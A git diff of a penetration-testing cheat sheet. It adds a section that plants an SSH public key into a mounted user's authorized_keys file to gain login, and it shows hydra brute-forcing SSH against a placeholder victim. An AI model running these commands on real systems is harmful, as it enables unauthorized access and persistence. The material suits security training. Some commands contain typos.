@@ -18,7 +18,7 @@
 - [Finger](#Finger)
   - [enumeration script](#enumeration_script)
   - [finger comandline](#finger_comandline)
-  - []()
+  - [ssh keygen](#ssh_keygen)
 - [HTTP](#HTTP)
   - [Directory scanning](#Directory_scanning)
   - [Subdomain_scanning](#Subdomain_scanning)
@@ -30,7 +30,7 @@
     - [vuln](#vuln)
     - [smb](#smb)
     - [shellshock](#shellshock)
- - [SQL](#SQL)
+- [SQL](#SQL)
   - [sql nmap scan](#sql_nmap_scan)
   - [sql metasploit](#sql_metasploit)
   - [mysql commands](#mysql_commands)
@@ -46,6 +46,7 @@
   - [SSH bruteforce](#SSH_bruteforce)
   - [SSH CVE 1](#SSH_CVE_1)
   - [SSH CVE 2](#SSH_CVE_2)
+  - []()
 - [RDP](#RDP)
   - [Connect to RPD](connect_RDP)
   - [nmap rdp scan](nmap_rdp_scan])
@@ -451,6 +452,14 @@ run
 ```
 hydra -v -V -l root -P password-file.txt [victim_ip] ssh
 hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh
+
+## ssh_keygen
+```
+ssh-keygen
+mkdir /mnt/user_name/.ssh
+touch /mnt/user_name/.ssh/authorized_keys
+cat ~/.ssh/id_rsa.pub > /mnt/user_name/.ssh/authorized_keys
+ssh use_name@[victim_ip
 ```
 
 ## SSH_CVE_1
